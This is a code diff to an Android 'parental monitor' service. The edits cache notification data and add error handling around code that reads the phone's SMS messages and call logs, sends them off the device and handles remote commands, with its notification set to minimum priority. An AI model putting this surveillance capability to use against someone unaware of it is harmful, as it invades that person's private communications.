@@ -90,10 +90,13 @@ class MonitoringService : Service() {
     private var lastTxBytes = -1L
     private var lastSpeedAt = 0L
     private var lastSpeedText = ""
+    private var cachedSpeedTap: android.app.PendingIntent? = null
+    private var cachedSpeedTitle = ""
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{3,15}$")
+        private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("<[^>]*>")
         const val ACTION_STOP_MONITORING = "STOP_MONITORING"
         private const val COMMAND_MAX_AGE_SEC = 900L
@@ -788,7 +791,7 @@ class MonitoringService : Service() {
             }
             return
         }
-        val parts = raw.split("\\s+".toRegex(), limit = 2)
+        val parts = raw.split(CMD_SPLIT_REGEX, limit = 2)
         val command = parts[0]
         val arg = parts.getOrNull(1)?.trim().orEmpty()
         try {
@@ -1448,8 +1451,20 @@ class MonitoringService : Service() {
     }
 
     private fun speedTapIntent(): android.app.PendingIntent {
+        cachedSpeedTap?.let { return it }
         val intent = android.content.Intent(this, com.redeye.parentalmonitor.ui.SpeedMonitorActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
-        return android.app.PendingIntent.getActivity(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
+        return android.app.PendingIntent.getActivity(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE).also { cachedSpeedTap = it }
+    }
+
+    private fun speedTitle(): String {
+        if (cachedSpeedTitle.isEmpty()) {
+            cachedSpeedTitle = try {
+                getString(R.string.notification_title)
+            } catch (_: Exception) {
+                ""
+            }
+        }
+        return cachedSpeedTitle
     }
 
     private fun startSpeedTracking() {
@@ -1487,7 +1502,7 @@ class MonitoringService : Service() {
                 try {
                     val notification = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
                         .setSmallIcon(R.drawable.ic_notification)
-                        .setContentTitle(getString(R.string.notification_title))
+                        .setContentTitle(speedTitle())
                         .setContentText(text)
                         .setContentIntent(speedTapIntent())
                         .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -1513,6 +1528,8 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         speedJob = null
+        cachedSpeedTap = null
+        cachedSpeedTitle = ""
     }
 
     private suspend fun sendInitialData() {
@@ -1656,17 +1673,32 @@ class MonitoringService : Service() {
         if (initialSyncRunning.get()) return
         if (authBlocked()) return
         try {
-            val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId).take(100)
+            val lastSms = try {
+                preferencesManager.lastSmsId
+            } catch (_: Exception) {
+                0L
+            }
+            val smsPage = smsRepository.getNewSms(lastSms).take(100)
             if (smsPage.isNotEmpty()) {
                 sendFitted(formatSmsMessage(smsPage))
-                preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
+                preferencesManager.lastSmsId = maxOf(lastSms, smsPage.maxOf { it.id })
             }
-            val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId).take(100)
+            val lastCallTs = try {
+                preferencesManager.lastCallTimestamp
+            } catch (_: Exception) {
+                0L
+            }
+            val lastCallId = try {
+                preferencesManager.lastCallId
+            } catch (_: Exception) {
+                0L
+            }
+            val callPage = callLogRepository.getNewCalls(lastCallTs, lastCallId).take(100)
             if (callPage.isNotEmpty()) {
                 sendFitted(formatCallMessage(callPage))
                 val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
-                if (latest.date > preferencesManager.lastCallTimestamp ||
-                    (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                if (latest.date > lastCallTs ||
+                    (latest.date == lastCallTs && latest.id > lastCallId)
                 ) {
                     preferencesManager.lastCallTimestamp = latest.date
                     preferencesManager.lastCallId = latest.id
